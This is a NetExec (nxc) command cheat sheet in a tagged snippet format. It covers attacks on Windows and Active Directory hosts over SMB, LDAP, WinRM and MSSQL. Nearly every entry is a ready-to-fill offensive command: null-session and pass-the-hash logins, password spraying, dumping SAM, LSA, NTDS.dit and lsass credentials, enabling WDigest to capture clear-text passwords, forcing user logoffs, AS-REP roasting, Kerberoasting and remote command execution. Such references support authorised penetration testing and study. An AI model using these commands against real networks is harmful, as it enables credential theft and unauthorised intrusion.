# nxc

% nxc, netexec, windows, Active directory

## nxc - enumerate hosts, network
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : nxc smb 192.168.1.0/24

https://www.netexec.wiki/

```bash
nxc smb <ip>
```

## nxc - enumerate password policy
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
nxc smb <ip> -u <user> -p '<password>' --pass-pol
```

## nxc - enumerate null session
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
nxc smb <ip> -u '' -p ''
```

## nxc - enumerate anonymous login
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
nxc smb <ip> -u 'a' -p ''
```

## nxc - enumerate active sessions
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --sessions
```

## nxc - enumerate domain users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --users
```

## nxc - enumerate users by bruteforce the RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --rid-brute
```

## nxc - enumerate domain groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --groups
```

## nxc - enumerate local groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --local-groups
```

## nxc - enumerate shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
nxc smb <ip> -u <user> -p <password> -d <domain> --shares
```

## nxc - enumerate disks
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
nxc smb <ip> -u <user> -p '<password>' --disks
```

## nxc - enumerate smb target not signed
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
nxc smb <ip> --gen-relay-list smb_targets.txt
```

## nxc - enumerate logged users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
nxc smb <ip> -u <user> -p '<password>' --loggedon-users
```

## nxc - enable wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
nxc smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## nxc - loggout user
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect

```bash
nxc smb <ip> -u <user> -p '<password>' -x 'quser'
nxc smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## nxc - local-auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
nxc smb <ip> -u <user> -p <password> --local-auth
```

## nxc - local-auth with hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
nxc smb <ip> -u <user> -H <hash> --local-auth
```

## nxc - domain auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
nxc smb <ip> -u <user> -p <password> -d <domain>
```

## nxc - kerberos auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
nxc smb <ip> --kerberos
```

## nxc - Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
nxc smb <ip> -u <user> -p <password> -d <domain> --sam
```

## nxc - Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> -p <password> -d <domain> --lsa
```

## nxc - dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
nxc smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## nxc - dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
nxc smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## nxc - dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
nxc smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## nxc - password spray (user=password)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
nxc smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## nxc - password spray multiple test 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(careful on lockout)

```bash
nxc smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## nxc - put file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## nxc - get file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
nxc smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

## nxc - ASREPRoast enum without authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
nxc ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## nxc - ASREPRoast enum with authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## nxc - Kerberoasting
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Hashcat format  -m 13100

```bash
nxc ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## nxc - Unconstrained delegation
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

```bash
nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## nxc - winrm-auth
#plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
nxc winrm <ip> -u <user> -p <password>
```

## nxc - mssql password spray
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
nxc mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## nxc - mssql execute query
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## nxc - mssql execute command
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
